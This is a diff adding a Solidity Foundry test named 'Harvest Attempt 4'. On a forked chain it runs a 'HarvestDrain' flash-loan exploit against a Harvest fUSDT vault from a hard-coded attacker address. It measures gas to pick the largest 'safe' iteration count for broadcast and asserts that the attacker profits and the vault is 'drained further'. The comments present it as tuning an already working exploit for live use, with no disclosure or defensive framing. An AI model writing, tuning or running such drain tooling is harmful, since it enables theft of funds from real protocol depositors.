@@ -1,0 +1,75 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.23;
+
+import "forge-std/Test.sol";
+import "../exploit/Run.s.sol";
+
+/// @title Harvest Attempt 4
+/// @notice Measures the stripped production path from `HarvestDrain.execute(N)` on the live fork.
+/// @dev Hypothesis: the passing Attempt3 exploit remains profitable after removing the tuner and hot-path
+///      logging, and the per-transaction gas cost determines the largest safe `N` for broadcast.
+contract Attempt4 is Test {
+    address payable internal constant ATTACKER = payable(0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14);
+    IHVault internal constant FUSDT_VAULT = IHVault(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
+    uint256 internal constant OUTER_USDT_FLASH = 10_000_000e6;
+    uint256 internal constant INNER_USDC_FLASH = 10_000_000e6;
+    uint256 internal constant SWAP_SIZE = 10_000_000e6;
+
+    function setUp() public {
+        vm.createSelectFork("ch2");
+    }
+
+    function test_execute_20() public {
+        _executeAndAssert(20);
+    }
+
+    function test_execute_50() public {
+        _executeAndAssert(50);
+    }
+
+    function test_execute_100() public {
+        _executeAndAssert(100);
+    }
+
+    function test_execute_200() public {
+        _executeAndAssert(200);
+    }
+
+    function test_execute_selected() public {
+        _executeAndAssert(vm.envUint("HARVEST_TEST_ITERATIONS"));
+    }
+
+    function _executeAndAssert(uint256 iterations) internal {
+        uint256 nativeBefore = ATTACKER.balance;
+        uint256 vaultBefore = FUSDT_VAULT.underlyingBalanceWithInvestment();
+
+        vm.startPrank(ATTACKER);
+        HarvestDrain drain = new HarvestDrain(
+            ATTACKER,
+            OUTER_USDT_FLASH,
+            INNER_USDC_FLASH,
+            0,
+            SWAP_SIZE
+        );
+        uint256 gasBefore = gasleft();
+        drain.execute(iterations);
+        uint256 executeGasUsed = gasBefore - gasleft();
+        vm.stopPrank();
+
+        uint256 nativeAfter = ATTACKER.balance;
+        uint256 vaultAfter = FUSDT_VAULT.underlyingBalanceWithInvestment();
+
+        console.log("ITERATIONS:", iterations);
+        console.log("BLOCK_GAS_LIMIT:", block.gaslimit);
+        console.log("EXECUTE_GAS_USED:", executeGasUsed);
+        console.log("ATTACKER_NATIVE_BEFORE:", nativeBefore);
+        console.log("ATTACKER_NATIVE_AFTER:", nativeAfter);
+        console.log("ATTACKER_NATIVE_DELTA:", nativeAfter - nativeBefore);
+        console.log("VAULT_UNDERLYING_BEFORE:", vaultBefore);
+        console.log("VAULT_UNDERLYING_AFTER:", vaultAfter);
+        console.log("VAULT_UNDERLYING_DELTA:", vaultBefore - vaultAfter);
+
+        assertGt(nativeAfter, nativeBefore, "native balance must strictly increase");
+        assertLt(vaultAfter, vaultBefore, "vault should be drained further");
+    }
+}
